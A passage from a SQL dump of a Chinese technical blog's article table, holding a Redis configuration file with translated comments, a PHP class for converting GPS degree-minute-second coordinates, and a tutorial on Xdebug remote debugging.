and</p><p># min-slaves-max-lag is set to 10.</p><p>################################## SECURITY ###################################</p><p># 需要客户端的任何命令被处理之前先验证身份，使用AUTH &lt;PASSWORD&gt;。这在不安全的环境中使用redis是非常有用的</p><p># Require clients to issue AUTH &lt;PASSWORD&gt; before processing any other</p><p># commands. &nbsp;This might be useful in environments in which you do not trust</p><p># others with access to the host running redis-server.</p><p>#</p><p># 这个选项在一般情况下从兼容性考虑应该保持被注释掉,因为大部分人都不需要认证（例如： 它们运行在自己的服务器上）</p><p># This should stay commented out for backward compatibility and because most</p><p># people do not need auth (e.g. they run their own servers).</p><p>#&nbsp;</p><p># 警告： Redis是非常快速的，因此，一个外部用户在每秒可以尝试150k个密码，这意味着你应该设置一个非常强壮的密码，否则别人将会非常容易的破解</p><p># Warning: since Redis is pretty fast an outside user can try up to</p><p># 150k passwords per second against a good box. This means that you should</p><p># use a very strong password otherwise it will be very easy to break.</p><p>#</p><p># requirepass foobared</p><p># 命令重命名</p><p># Command renaming.</p><p>#</p><p># 可以修改一些危险的命令为其它名称（在共享环境中），例如CONFIG命令可以被重命名为其它很难猜测的名称以保证内部工具可以使用，但是对于普通客户端不可用</p><p># It is possible to change the name of dangerous commands in a shared</p><p># environment. For instance the CONFIG command may be renamed into something</p><p># hard to guess so that it will still be available for internal-use tools</p><p># but not available for general clients.</p><p>#</p><p># Example:</p><p>#</p><p># rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52</p><p>#</p><p># 也可以通过重命名命令为空字符串以完全屏蔽这个命令</p><p># It is also possible to completely kill a command by renaming it into</p><p># an empty string:</p><p>#</p><p># rename-command CONFIG &quot;&quot;</p><p>#</p><p># 注意的是，改变命令的名字将会被记录到AOF文件中，或者传送给从库造成一些问题</p><p># Please note that changing the name of commands that are logged into the</p><p># AOF file or transmitted to slaves may cause problems.</p><p>################################### LIMITS ####################################</p><p># 设置同一时间连接的最大客户端数量。默认情况下，这个限制被设置为10000个客户端</p><p># Set the max number of connected clients at the same time. By default</p><p># this limit is set to 10000 clients, however if the Redis server is not</p><p># able to configure the process file limit to allow for the specified limit</p><p># the max number of allowed clients is set to the current file limit</p><p># minus 32 (as Redis reserves a few file descriptors for internal uses).</p><p>#</p><p># 一旦客户端数量达到上线，Redis将会关闭所有新的连接，并且发送一个&#39;max number of clients reached&#39;的错误</p><p># Once the limit is reached Redis will close all the new connections sending</p><p># an error &#39;max number of clients reached&#39;.</p><p>#</p><p># maxclients 10000</p><p># 不要使用超过指定数量的内存, 当Redis的内存上限达到的时候，Redis将会根据所选择收回策略移除一些key</p><p># Don&#39;t use more memory than the specified amount of bytes.</p><p># When the memory limit is reached Redis will try to remove keys</p><p># according to the eviction policy selected (see maxmemory-policy).</p><p>#</p><p># 如果Redis不能够依据指定的策略移除key，或者是策略被设置为非收回‘noeviction’，Redis将会对试图使用更多内存的命令回应错误信息,对只读的命令继续响应</p><p># If Redis can&#39;t remove keys according to the policy, or if the policy is</p><p># set to &#39;noeviction&#39;, Redis will start to reply with errors to commands</p><p># that would use more memory, like SET, LPUSH, and so on, and will continue</p><p># to reply to read-only commands like GET.</p><p>#</p><p># 当使用Redis作为一个LRU缓存或者是为实例设置一个内存限制的时候，这个选项通常是非常有用的</p><p># This option is usually useful when using Redis as an LRU cache, or to set</p><p># a hard memory limit for an instance (using the &#39;noeviction&#39; policy).</p><p>#</p><p># WARNING: If you have slaves attached to an instance with maxmemory on,</p><p># the size of the output buffers needed to feed the slaves are subtracted</p><p># from the used memory count, so that network problems / resyncs will</p><p># not trigger a loop where keys are evicted, and in turn the output</p><p># buffer of slaves is full with DELs of keys evicted triggering the deletion</p><p># of more keys, and so forth until the database is completely emptied.</p><p>#</p><p># 简言之，如果你有一个从库的话，建议为maxmemory设置一个更低的限制，这样才能有一些空闲的内存用于为从库输出缓冲文件（如果策略是noeviction的话，这个选项是不需要的）`</p><p># In short... if you have slaves attached it is suggested that you set a lower</p><p># limit for maxmemory so that there is some free RAM on the system for slave</p><p># output buffers (but this is not needed if the policy is &#39;noeviction&#39;).</p><p>#</p><p># maxmemory &lt;bytes&gt;</p><p># 最大内存策略： redis在达到最大内存限制的时候如何选择移除哪些key，你可以选择下面五种之一：</p><p># MAXMEMORY POLICY: how Redis will select what to remove when maxmemory</p><p># is reached. You can select among five behaviors:</p><p>#&nbsp;</p><p># volatile-lru -&gt; remove the key with an expire set using an LRU algorithm</p><p># allkeys-lru -&gt; remove any key accordingly to the LRU algorithm</p><p># volatile-random -&gt; remove a random key with an expire set</p><p># allkeys-random -&gt; remove a random key, any key</p><p># volatile-ttl -&gt; remove the key with the nearest expire time (minor TTL)</p><p># noeviction -&gt; don&#39;t expire at all, just return an error on write operations</p><p>#&nbsp;</p><p># Note: with any of the above policies, Redis will return an error on write</p><p># &nbsp; &nbsp; &nbsp; operations, when there are not suitable keys for eviction.</p><p>#</p><p># &nbsp; &nbsp; &nbsp; At the date of writing this commands are: set setnx setex append</p><p># &nbsp; &nbsp; &nbsp; incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd</p><p># &nbsp; &nbsp; &nbsp; sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby</p><p># &nbsp; &nbsp; &nbsp; zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby</p><p># &nbsp; &nbsp; &nbsp; getset mset msetnx exec sort</p><p>#</p><p># The default is:</p><p>#</p><p># maxmemory-policy volatile-lru</p><p># LRU and minimal TTL algorithms are not precise algorithms but approximated</p><p># algorithms (in order to save memory), so you can select as well the sample</p><p># size to check. For instance for default Redis will check three keys and</p><p># pick the one that was used less recently, you can change the sample size</p><p># using the following configuration directive.</p><p>#</p><p># maxmemory-samples 3</p><p>############################## APPEND ONLY MODE ###############################</p><p># 默认情况下Redis将会异步的导出数据集到磁盘上。这种模式在大部分应用程序中是足够好用的，但是当断电或者是Redis处理时出现问题会造成几分钟内写入的结果丢失（依赖于配置的保存点）</p><p># By default Redis asynchronously dumps the dataset on disk. This mode is</p><p># good enough in many applications, but an issue with the Redis process or</p><p># a power outage may result into a few minutes of writes lost (depending on</p><p># the configured save points).</p><p>#</p><p># 文件追加模式是一个可选的持久化模式，它提供了更好的持久性。例如使用默认的同步策略(fsync)，在断电等突发情况下，Redis可能只会丢失一秒的写入操作，但是系统还是可以正常运行的</p><p># The Append Only File is an alternative persistence mode that provides</p><p># much better durability. For instance using the default data fsync policy</p><p># (see later in the config file) Redis can lose just one second of writes in a</p><p># dramatic event like a server power outage, or a single write if something</p><p># wrong with the Redis process itself happens, but the operating system is</p><p># still running correctly.</p><p>#</p><p># AOP和RDB持久化可以同时使用，如果AOP启用了，在Redis启动的时候竟会载入AOF文件，这个文件提供了更好的持久性保证</p><p># AOF and RDB persistence can be enabled at the same time without problems.</p><p># If the AOF is enabled on startup Redis will load the AOF, that is the file</p><p># with the better durability guarantees.</p><p>#</p><p># Please check http://redis.io/topics/persistence for more information.</p><p>appendonly no</p><p># 追加文件的文件名，默认是appendonly.aof</p><p># The name of the append only file (default: &quot;appendonly.aof&quot;)</p><p>appendfilename &quot;appendonly.aof&quot;</p><p># fsync()调用告诉操作系统直接将数据写入到磁盘而不是输出缓冲区。一些OS将会真实的刷新数据到磁盘上，其它一些操作系统将会尝试尽快的去做（ASAP）</p><p># The fsync() call tells the Operating System to actually write data on disk</p><p># instead to wait for more data in the output buffer. Some OS will really flush&nbsp;</p><p># data on disk, some other OS will just try to do it ASAP.</p><p>#</p><p># Redis支持三种不同的模式</p><p># Redis supports three different modes:</p><p>#</p><p># no: 不要fsync，让操作系统在它需要的时候才刷新数据到磁盘。</p><p># always： 每次写入到追加日志之后调用fsync</p><p># everysec: 每秒调用一次fsync</p><p># no: don&#39;t fsync, just let the OS flush the data when it wants. Faster.</p><p># always: fsync after every write to the append only log . Slow, Safest.</p><p># everysec: fsync only one time every second. Compromise.</p><p>#</p><p># 默认值是everysec，通常这是在速度和数据安全上的折中方案。</p><p># The default is &quot;everysec&quot;, as that&#39;s usually the right compromise between</p><p># speed and data safety. It&#39;s up to you to understand if you can relax this to</p><p># &quot;no&quot; that will let the operating system flush the output buffer when</p><p># it wants, for better performances (but if you can live with the idea of</p><p># some data loss consider the default persistence mode that&#39;s snapshotting),</p><p># or on the contrary, use &quot;always&quot; that&#39;s very slow but a bit safer than</p><p># everysec.</p><p>#</p><p># More details please check the following article:</p><p># http://antirez.com/post/redis-persistence-demystified.html</p><p>#</p><p># If unsure, use &quot;everysec&quot;.</p><p># appendfsync always</p><p>appendfsync everysec</p><p># appendfsync no</p><p># When the AOF fsync policy is set to always or everysec, and a background</p><p># saving process (a background save or AOF log background rewriting) is</p><p># performing a lot of I/O against the disk, in some Linux configurations</p><p># Redis may block too long on the fsync() call. Note that there is no fix for</p><p># this currently, as even performing fsync in a different thread will block</p><p># our synchronous write(2) call.</p><p>#</p><p># In order to mitigate this problem it&#39;s possible to use the following option</p><p># that will prevent fsync() from being called in the main process while a</p><p># BGSAVE or BGREWRITEAOF is in progress.</p><p>#</p><p># This means that while another child is saving, the durability of Redis is</p><p># the same as &quot;appendfsync none&quot;. In practical terms, this means that it is</p><p># possible to lose up to 30 seconds of log in the worst scenario (with the</p><p># default Linux settings).</p><p>#&nbsp;</p><p># If you have latency problems turn this to &quot;yes&quot;. Otherwise leave it as</p><p># &quot;no&quot; that is the safest pick from the point of view of durability.</p><p>no-appendfsync-on-rewrite no</p><p># Automatic rewrite of the append only file.</p><p># Redis is able to automatically rewrite the log file implicitly calling</p><p># BGREWRITEAOF when the AOF log size grows by the specified percentage.</p><p>#&nbsp;</p><p># This is how it works: Redis remembers the size of the AOF file after the</p><p># latest rewrite (if no rewrite has happened since the restart, the size of</p><p># the AOF at startup is used).</p><p>#</p><p># This base size is compared to the current size. If the current size is</p><p># bigger than the specified percentage, the rewrite is triggered. Also</p><p># you need to specify a minimal size for the AOF file to be rewritten, this</p><p># is useful to avoid rewriting the AOF file even if the percentage increase</p><p># is reached but it is still pretty small.</p><p>#</p><p># Specify a percentage of zero in order to disable the automatic AOF</p><p># rewrite feature.</p><p>auto-aof-rewrite-percentage 100</p><p>auto-aof-rewrite-min-size 64mb</p><p>################################ LUA SCRIPTING &nbsp;###############################</p><p># Max execution time of a Lua script in milliseconds.</p><p>#</p><p># If the maximum execution time is reached Redis will log that a script is</p><p># still in execution after the maximum allowed time and will start to</p><p># reply to queries with an error.</p><p>#</p><p># When a long running script exceed the maximum execution time only the</p><p># SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be</p><p># used to stop a script that did not yet called write commands. The second</p><p># is the only way to shut down the server in the case a write commands was</p><p># already issue by the script but the user don&#39;t want to wait for the natural</p><p># termination of the script.</p><p>#</p><p># Set it to 0 or a negative value for unlimited execution without warnings.</p><p>lua-time-limit 5000</p><p>################################## SLOW LOG ###################################</p><p># The Redis Slow Log is a system to log queries that exceeded a specified</p><p># execution time. The execution time does not include the I/O operations</p><p># like talking with the client, sending the reply and so forth,</p><p># but just the time needed to actually execute the command (this is the only</p><p># stage of command execution where the thread is blocked and can not serve</p><p># other requests in the meantime).</p><p>#&nbsp;</p><p># You can configure the slow log with two parameters: one tells Redis</p><p># what is the execution time, in microseconds, to exceed in order for the</p><p># command to get logged, and the other parameter is the length of the</p><p># slow log. When a new command is logged the oldest one is removed from the</p><p># queue of logged commands.</p><p># The following time is expressed in microseconds, so 1000000 is equivalent</p><p># to one second. Note that a negative number disables the slow log, while</p><p># a value of zero forces the logging of every command.</p><p>slowlog-log-slower-than 10000</p><p># There is no limit to this length. Just be aware that it will consume memory.</p><p># You can reclaim memory used by the slow log with SLOWLOG RESET.</p><p>slowlog-max-len 128</p><p>############################# Event notification ##############################</p><p># Redis can notify Pub/Sub clients about events happening in the key space.</p><p># This feature is documented at http://redis.io/topics/keyspace-events</p><p>#&nbsp;</p><p># For instance if keyspace events notification is enabled, and a client</p><p># performs a DEL operation on key &quot;foo&quot; stored in the Database 0, two</p><p># messages will be published via Pub/Sub:</p><p>#</p><p># PUBLISH __keyspace@0__:foo del</p><p># PUBLISH __keyevent@0__:del foo</p><p>#</p><p># It is possible to select the events that Redis will notify among a set</p><p># of classes. Every class is identified by a single character:</p><p>#</p><p># &nbsp;K &nbsp; &nbsp; Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.</p><p># &nbsp;E &nbsp; &nbsp; Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.</p><p># &nbsp;g &nbsp; &nbsp; Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...</p><p># &nbsp;$ &nbsp; &nbsp; String commands</p><p># &nbsp;l &nbsp; &nbsp; List commands</p><p># &nbsp;s &nbsp; &nbsp; Set commands</p><p># &nbsp;h &nbsp; &nbsp; Hash commands</p><p># &nbsp;z &nbsp; &nbsp; Sorted set commands</p><p># &nbsp;x &nbsp; &nbsp; Expired events (events generated every time a key expires)</p><p># &nbsp;e &nbsp; &nbsp; Evicted events (events generated when a key is evicted for maxmemory)</p><p># &nbsp;A &nbsp; &nbsp; Alias for g$lshzxe, so that the &quot;AKE&quot; string means all the events.</p><p>#</p><p># &nbsp;The &quot;notify-keyspace-events&quot; takes as argument a string that is composed</p><p># &nbsp;by zero or multiple characters. The empty string means that notifications</p><p># &nbsp;are disabled at all.</p><p>#</p><p># &nbsp;Example: to enable list and generic events, from the point of view of the</p><p># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; event name, use:</p><p>#</p><p># &nbsp;notify-keyspace-events Elg</p><p>#</p><p># &nbsp;Example 2: to get the stream of the expired keys subscribing to channel</p><p># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; name __keyevent@0__:expired use:</p><p>#</p><p># &nbsp;notify-keyspace-events Ex</p><p>#</p><p># &nbsp;By default all notifications are disabled because most users don&#39;t need</p><p># &nbsp;this feature and the feature has some overhead. Note that if you don&#39;t</p><p># &nbsp;specify at least one of K or E, no events will be delivered.</p><p>notify-keyspace-events &quot;&quot;</p><p>############################### ADVANCED CONFIG ###############################</p><p># Hashes are encoded using a memory efficient data structure when they have a</p><p># small number of entries, and the biggest entry does not exceed a given</p><p># threshold. These thresholds can be configured using the following directives.</p><p>hash-max-ziplist-entries 512</p><p>hash-max-ziplist-value 64</p><p># Similarly to hashes, small lists are also encoded in a special way in order</p><p># to save a lot of space. The special representation is only used when</p><p># you are under the following limits:</p><p>list-max-ziplist-entries 512</p><p>list-max-ziplist-value 64</p><p># Sets have a special encoding in just one case: when a set is composed</p><p># of just strings that happens to be integers in radix 10 in the range</p><p># of 64 bit signed integers.</p><p># The following configuration setting sets the limit in the size of the</p><p># set in order to use this special memory saving encoding.</p><p>set-max-intset-entries 512</p><p># Similarly to hashes and lists, sorted sets are also specially encoded in</p><p># order to save a lot of space. This encoding is only used when the length and</p><p># elements of a sorted set are below the following limits:</p><p>zset-max-ziplist-entries 128</p><p>zset-max-ziplist-value 64</p><p># Active rehashing uses 1 millisecond every 100 milliseconds of CPU time in</p><p># order to help rehashing the main Redis hash table (the one mapping top-level</p><p># keys to values). The hash table implementation Redis uses (see dict.c)</p><p># performs a lazy rehashing: the more operation you run into a hash table</p><p># that is rehashing, the more rehashing &quot;steps&quot; are performed, so if the</p><p># server is idle the rehashing is never complete and some more memory is used</p><p># by the hash table.</p><p>#&nbsp;</p><p># The default is to use this millisecond 10 times every second in order to</p><p># active rehashing the main dictionaries, freeing memory when possible.</p><p>#</p><p># If unsure:</p><p># use &quot;activerehashing no&quot; if you have hard latency requirements and it is</p><p># not a good thing in your environment that Redis can reply form time to time</p><p># to queries with 2 milliseconds delay.</p><p>#</p><p># use &quot;activerehashing yes&quot; if you don&#39;t have such hard requirements but</p><p># want to free memory asap when possible.</p><p>activerehashing yes</p><p># The client output buffer limits can be used to force disconnection of clients</p><p># that are not reading data from the server fast enough for some reason (a</p><p># common reason is that a Pub/Sub client can&#39;t consume messages as fast as the</p><p># publisher can produce them).</p><p>#</p><p># The limit can be set differently for the three different classes of clients:</p><p>#</p><p># normal -&gt; normal clients</p><p># slave &nbsp;-&gt; slave clients and MONITOR clients</p><p># pubsub -&gt; clients subscribed to at least one pubsub channel or pattern</p><p>#</p><p># The syntax of every client-output-buffer-limit directive is the following:</p><p>#</p><p># client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</p><p>#</p><p># A client is immediately disconnected once the hard limit is reached, or if</p><p># the soft limit is reached and remains reached for the specified number of</p><p># seconds (continuously).</p><p># So for instance if the hard limit is 32 megabytes and the soft limit is</p><p># 16 megabytes / 10 seconds, the client will get disconnected immediately</p><p># if the size of the output buffers reach 32 megabytes, but will also get</p><p># disconnected if the client reaches 16 megabytes and continuously overcomes</p><p># the limit for 10 seconds.</p><p>#</p><p># By default normal clients are not limited because they don&#39;t receive data</p><p># without asking (in a push way), but just after a request, so only</p><p># asynchronous clients may create a scenario where data is requested faster</p><p># than it can read.</p><p>#</p><p># Instead there is a default limit for pubsub and slave clients, since</p><p># subscribers and slaves receive data in a push fashion.</p><p>#</p><p># Both the hard or the soft limit can be disabled by setting them to zero.</p><p>client-output-buffer-limit normal 0 0 0</p><p>client-output-buffer-limit slave 256mb 64mb 60</p><p>client-output-buffer-limit pubsub 32mb 8mb 60</p><p># Redis calls an internal function to perform many background tasks, like</p><p># closing connections of clients in timeout, purging expired keys that are</p><p># never requested, and so forth.</p><p>#</p><p># Not all tasks are performed with the same frequency, but Redis checks for</p><p># tasks to perform accordingly to the specified &quot;hz&quot; value.</p><p>#</p><p># By default &quot;hz&quot; is set to 10. Raising the value will use more CPU when</p><p># Redis is idle, but at the same time will make Redis more responsive when</p><p># there are many keys expiring at the same time, and timeouts may be</p><p># handled with more precision.</p><p>#</p><p># The range is between 1 and 500, however a value over 100 is usually not</p><p># a good idea. Most users should use the default of 10 and raise this up to</p><p># 100 only in environments where very low latency is required.</p><p>hz 10</p><p># When a child rewrites the AOF file, if the following option is enabled</p><p># the file will be fsync-ed every 32 MB of data generated. This is useful</p><p># in order to commit the file to the disk more incrementally and avoid</p><p># big latency spikes.</p><p>aof-rewrite-incremental-fsync yes</p><p><br/></p>', 'Redis配置文件，部分英文注释已经翻译为中文，方便学习使用', 'http://agiledev-arsenals.stor.sinaapp.com/cover/25f9ecb6bb4518f5541a14fc6b1d32e5.png', 'mylxsw', '翻译', 1, 0, 1403582889, NULL, NULL, 'html'),
(361, '地理坐标度分秒格式转换为度的方式', '如何从GPS坐标的度分秒格式转换成度的形式？\r\n\r\n```php\r\n/**\r\n * Exif信息转换\r\n */\r\nclass Com_Exif{\r\n    /**\r\n     * 将地理坐标的度分秒格式转换为数字格式，保留两位小数\r\n     * @param $pos\r\n     * @return string\r\n     */\r\n    public static function gpsPosToFloat($pos){\r\n        // 去掉所有空格，并且取出度分秒值\r\n        $pos = str_replace('' '', '''', $pos );\r\n        $pos_arr = explode('','', $pos);\r\n\r\n        if(count($pos_arr) != 3){\r\n            return '''';\r\n        }\r\n\r\n        // 将度分秒转换为小数\r\n        $du = self::_calStr($pos_arr[0]);\r\n        $min = self::_calStr($pos_arr[1]);\r\n        $sec = self::_calStr($pos_arr[2]);\r\n\r\n        return sprintf(''%.2f'', $du + $min / 60 + $sec / 3600);\r\n    }\r\n\r\n    /**\r\n     * 将542232/1000这种类型的字符串转换为做除法后的浮点数\r\n     * @param $str\r\n     * @return float|int\r\n     */\r\n    private static function _calStr($str){\r\n        if(strpos($str, ''/'') != -1){\r\n            list($opt1, $opt2) = explode(''/'', $str);\r\n            return intval($opt1) / intval($opt2);\r\n        }\r\n\r\n        return $str == '''' ? 0 : floatval($str);\r\n    }\r\n}\r\n\r\n```', '如何从GPS坐标的度分秒格式转换成度的形式？', 'http://agiledev-arsenals.stor.sinaapp.com/cover/ddf47c4ee7aa4b3945948de6dd9e5a7f.jpg', 'mylxsw', '原创', 1, 0, 1404959639, 1414859637, 0, 'markdown');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(362, 'PHP使用Xdebug进行远程调试', 'Xdebug提供了客户端与PHP脚本进行交互的接口，这一章将会介绍如何让PHP和Xdebug开启这个特性，并且介绍一些常用的客户端。\r\n\r\n###概述\r\n\r\nXdebug(远程)调试器允许测试数据结构，步进并且调试你的代码。Xdebug提供了两种协议用于与其进行交互：在Xdebug1.3和2中旧的```GDB协议```和Xdebug2中实现的```DBGp协议```。\r\n\r\n###客户端\r\n\r\nXdebug2 为DBGp协议提供了一个简单的基于命令行的客户端，当然，也有一些其它的客户端实现（免费的和商业的）。我不是这些客户端的作者，所以请到作者的网站寻找使用帮助。\r\n\r\n- [Dev-PHP](http://devphp.sf.net/) (IDE: Windows)\r\n- Eclipse plugin, which has been submitted as an enhancement for the PDT (IDE).\r\n- Emacs plugin (Editor Plugin).\r\n- ActiveState''s Komodo (IDE: Windows, Linux, Mac; Commercial).\r\n- [MacGDBP](https://www.bluestatic.org/software/macgdbp/index.php) - Standalone Mac client.\r\n- NetBeans (IDE: Windows, Linux, Mac OS X and Solaris.\r\n- Notepad++ plugin (Editor: Windows).\r\n- WaterProof''s PHPEdit (IDE, from version 2.10: Windows; Commercial).\r\n- Anchor System''s Peggy (IDE: Windows, Japanese; Commercial).\r\n- MP Software''s phpDesigner (IDE: Windows, Commercial).\r\n- PHPEclipse (Editor Plugin).\r\n- JetBrain''sPhpStorm (IDE; Commercial).\r\n- Protoeditor (Editor: Linux).\r\n- tsWebeditor (Editor: Windows).\r\n- Xored''s TrueStudio IDE (IDE; Commercial).\r\n- VIM [plugin](http://www.vim.org/scripts/script.php?script_id=1929) ([Tutorial](http://tech.blog.box.net/2007/06/20/how-to-debug-php-with-vim-and-xdebug-on-linux/)) (Editor Plugin).\r\n- jcx software''s VS.Php (MS Visual Studio Plugin; Commercial).\r\n- XDebugClient - Standalone Windows client.\r\n\r\nXdebug1.3也带有一个基于GDB协议的简单的命令行客户端。\r\n\r\n###启动调试器\r\n\r\n为了启用Xdebug的调试器，你需要在```php.ini```文件中做一些配置。这些配置包含```xdebug.remote_enable```用来允许调试器，```xdebug.remote_host```和```xdebug.remote_port```指定调试器应该连接到的IP地址和端口号。如果你希望调试器能够在发生错误（php错误或者异常）的时候初始化一个session的话，你需要修改```xdebug.remote_mode```配置，该配置项允许的值有```req```（默认）让调试器在所有脚本开始执行的时候初始化session或者是```jit```让发生错误的时候才初始化一个session。\r\n\r\n当完成以上配置之后，你会发现在脚本运行的时候，Xdebug并没有自动的开启一个调试会话。你还需要按照下面的方法激活Xdebug的调试器。\r\n\r\n1. 当从命令行运行脚本的时候，你需要设置一个环境变量，如下面所述\r\n\r\n	<pre>export XDEBUG_CONFIG="idekey=session_name"\r\nphp myscript.php</pre>\r\n\r\n	你也可以配置```xdebug.remote_host```, ```xdebug.remote_port```, ```xdebug.remote_mode```和```xdebug.remote_handler``` 这些选项：\r\n	\r\n	<pre>export XDEBUG_CONFIG="idekey=session_name remote_host=localhost profiler_enable=1"</pre>\r\n\r\n	这里你设置的这些所有的配置项也可以在php.ini文件中进行设置。\r\n	\r\n2. 如果你希望通过调试一个通过浏览器访问的脚本，只需要在访问的参数中添加```XDEBUG_SESSION_START=session_name```作为参数传递即可，再下一章节中你将看到一个调试会话如何从浏览器窗口中工作。\r\n\r\n3. 另一种方法激活xdebug是在浏览器运行时通过安装以下三个浏览器扩展之一。下面的每一个扩展都允许你通过单击个按钮就可以开启调试器。	这些扩展如下：\r\n\r\n	- **最简单的Xdebug**	   \r\n	这个扩展是Firefox上用于使得与IDE一起调试起来更加容易。你可以在[https://addons.mozilla.org/en-US/firefox/addon/the-easiest-xdebug/](https://addons.mozilla.org/en-US/firefox/addon/the-easiest-xdebug/)上找到这个扩展.\r\n	- **Xdebug Helper for Chrome**   \r\n	这个扩展是运行在Chrome浏览器上的，它将会帮助你通过点击一下按钮就可以允许/禁止调试和性能分析T。你可以在[https://chrome.google.com/extensions/detail/eadndfjplgieldjbigjakmdgkmoaaaoc](https://chrome.google.com/extensions/detail/eadndfjplgieldjbigjakmdgkmoaaaoc)找到这个扩展.\r\n	- **Xdebug Toggler for Safari**    \r\n	这个扩展是运行在Safari上的，允许你在Safari中自动的开始Xdebug调试过程，你可以在Github上找到这个扩展[https://github.com/benmatselby/xdebug-toggler](https://github.com/benmatselby/xdebug-toggler).\r\n	- **Xdebug launcher for Opera**   \r\n	这个扩展是运行在Opera上的，它允许你在Xdebug上开启一个Xdebug会话。\r\n\r\n在开始执行脚本之前，首先需要告诉客户端可以接收调试连接，请查看您使用的客户端的文档以获取如何这样去做。要使用绑定的客户端，首先需要 [安装](http://xdebug.org/docs/install#debugclient) 它，安装完成后你可以通过运行命令"```debugclient```"命令。如果你希望使用GDB命令集去调试你的脚本，你需要确定你使用的是Xdebug1.3绑定的客户端。\r\n\r\n当debugclient开始运行之后，它将会显示以下信息，并且等待来自等待直到debug服务器连接到来以便进行初始化：\r\n<pre>\r\nXdebug Simple DBGp client (0.10.0)\r\nCopyright 2002-2007 by Derick Rethans.\r\n- libedit support: enabled\r\n	 \r\nWaiting for debug server to connect.\r\n</pre>\r\n在连接完成后，debug服务器将会显示下面的输出：\r\n<pre>\r\nConnect\r\n&lt;?xml version="1.0" encoding="iso-8859-1"?>\r\n&lt;init xmlns="urn:debugger_protocol_v1"\r\n      xmlns:xdebug="http://xdebug.org/dbgp/xdebug"\r\n      fileuri="file:///home/httpd/www.xdebug.org/html/docs/index.php"\r\n      language="PHP"\r\n      protocol_version="1.0"\r\n      appid="13202"\r\n      idekey="derick">\r\n  &lt;engine version="2.0.0RC4-dev">&lt;![CDATA[Xdebug]]>&lt;/engine>\r\n  &lt;author>&lt;![CDATA[Derick Rethans]]>&lt;/author>\r\n  &lt;url>&lt;![CDATA[http://xdebug.org]]>&lt;/url>\r\n  <&lt;opyright>&lt;![CDATA[Copyright (c) 2002-2007 by Derick Rethans]]>&lt;/copyright>\r\n&lt;/init>\r\n(cmd)\r\n</pre>\r\n\r\n接下来你就可以使用 [DBGp](http://xdebug.org/docs-dbgp.php) 文档中描述的命令集进行操作了。\r\n当脚本执行结束的时候，调试服务器将会断开与客户端的连接，并且还原到等待新的连接请求的状态。\r\n\r\n###连接建立\r\n\r\n####对于有静态IP、单个开发者\r\n\r\n使用Xdebug的远程调试，Xdebug作为一个嵌入到PHP的程序，扮演着客户端的角色，而IDE则作为服务器。下面的动态图展示了连接建立的过程。\r\n\r\n![连接建立过程](http://xdebug.org/images/docs/dbgp-setup.gif)\r\n\r\n- 服务端的IP为10.0.1.2， 使用HTTP协议，端口为80\r\n- IDE在IP地址为10.0.1.42的机器上，```xdebug.remote_host```被设置为10.0.1.42\r\n- IDE监听9000端口，因此，```xdebug.remote_port```设置为9000\r\n- HTTP请求从运行这IDE的服务器上发起\r\n- Xdebug连接到10.0.1.42:9000\r\n- 调试开始运行，返回HTTP响应\r\n\r\n####使用非固定IP，多个开发者\r\n\r\n如果使用了```xdebug.remote_connect_back```指令的话，连接的建立过程是不同的：\r\n\r\n![连接建立过程](http://xdebug.org/images/docs/dbgp-setup2.gif)\r\n\r\n- 服务端的IP是10.0.1.2, 端口为80\r\n- IDE运行在一个动态IP的计算机上，因此设置```xdebug.remote_connect_back```为1\r\n- IDE监听端口 9000， 因此，配置```xdebug.remote_port``` 为9000\r\n- 发送HTTP请求，Xdebug检测HTTP header中的IP地址\r\n- 调试开始运行，产生HTTP响应\r\n\r\n###HTTP调试会话\r\n\r\n当使用浏览器进行Debug的时候，Xdebug支持吃用cookie跟踪会话的功能。\r\n\r\n- 当参数```XDEBUG_SESSION_START=name```被附加到URL地址上，Xdebug将会设置一个名为```XDEBUG_SESSION```，值为参数```XDEBUG_SESSION_START```指定的名称的Cookie。这个Cookie的过期时间是一个小时。```DBGp```协议也会在初始化包中传递一个同样的值，这样就可以连接到设置了```idekey```属性的客户端了。\r\n- 当设置了一个名为```XDEBUG_SESSION_START```的GET（POST）变量或者```XDEBUG_SESSION```的Cookie的话，Xdebug将会尝试去连接debugcliet\r\n- 要停止xdebug会话的话，只需要传递一个```XDEBUG_SESSION_STOP```的参数，然后Xdebug将不会再去尝试连接debugclient。\r\n\r\n###多用户调试\r\nXdebug只允许你使用指定的IP地址（```xdebug.remote_host```）进行远程调试连接.他不会自动的连接回浏览器运行访问的机器IP，除非你是用```xdebug.remote_connect_back```指令。\r\n\r\n如果你的开发者们在同一个服务器上的不同的项目上面进行开发，你可以使用Apache的每个目录中的```.htaccess```功能指定```xdebug.remote_host```指令，配置```php_value xdebug.remote_host=10.0.0.5```。 但是，如果是多个开发者在同样的代码上进行开发的话，```.htaccess```将无法完成该项功能。\r\n\r\n针对这个问题，这里有两个解决方案。第一个是你可以使用DGBp代理，对于如何使用这个代理，请查看[多用户调试](http://derickrethans.nl/debugging-with-multiple-users.html)这篇文章。你可以在 [ActiveState的站点](http://derickrethans.nl/debugging-with-multiple-users.html) 下载这个代理。这里有更多的文档在[Komodo FAQ](http://community.activestate.com/faq/komodo-ide-debugger-proxy-pydbgpproxy).\r\n\r\n第二个方案是可以使用```xdebug.remote_connect_back```配置项（Xdebug 2.1之后引入）。\r\n\r\n###相关配置\r\n\r\n- **xdebug.extended_info**   \r\n	Type: integer, Default value: 1\r\n	\r\n	控制Xdebug是否应该强制PHP解释器使用''extended_info''模式；这使得Xdebug可以使用远程调试器对文件或者行设置断点。当对脚本进行堆栈跟踪或者是性能调试的时候通常希望关闭这个选项，因为为PHP增加的一些调试属性将会减慢脚本的执行，影响最终结果。这个属性只能在```php.ini```文件中设置，不能够在脚本中通过```ini_set()```函数进行设置。\r\n	\r\n- **xdebug.idekey**   